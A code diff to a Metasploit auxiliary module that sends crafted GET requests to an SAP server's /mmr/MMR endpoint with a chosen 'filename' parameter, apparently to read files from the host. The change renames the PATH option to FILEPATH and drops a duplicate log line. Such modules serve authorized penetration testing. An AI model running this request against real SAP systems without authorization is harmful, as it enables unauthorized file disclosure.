@@ -52,7 +52,7 @@ class Metasploit4 < Msf::Auxiliary
 		user_pass = Rex::Text.encode_base64(datastore['USER'] + ":" + datastore['PASS'])
 		begin
 			if datastore['USER'].empty?
-				vprint_status("[SAP] #{ip}:#{rport} - Sending unauthenticated request for #{datastore['PATH']}")
+				vprint_status("[SAP] #{ip}:#{rport} - Sending unauthenticated request for #{datastore['FILEPATH']}")
 				res = send_request_cgi({
 					'uri' => '/mmr/MMR',
 					'method' => 'GET',
@@ -61,13 +61,12 @@ class Metasploit4 < Msf::Auxiliary
 					'vars_get' => {
 						'sap-client' => datastore['CLIENT'],
 						'sap-language' => 'EN',
-						'filename' => + datastore['PATH']
+						'filename' => + datastore['FILEPATH']
 					}
 				})
 
 			else
-				print_status("[SAP] #{ip}:#{rport} - sending authenticated request for #{datastore['PATH']}")
-				vprint_status("[SAP] #{ip}:#{rport} - Sending unauthenticated request for #{datastore['PATH']}")
+				vprint_status("[SAP] #{ip}:#{rport} - Sending unauthenticated request for #{datastore['FILEPATH']}")
 				res = send_request_cgi({
 					'uri' => '/mmr/MMR',
 					'method' => 'GET',
@@ -77,7 +76,7 @@ class Metasploit4 < Msf::Auxiliary
 					'vars_get' => {
 						'sap-client' => datastore['CLIENT'],
 						'sap-language' => 'EN',
-						'filename' => + datastore['PATH']
+						'filename' => + datastore['FILEPATH']
 					}
 				})
 			end
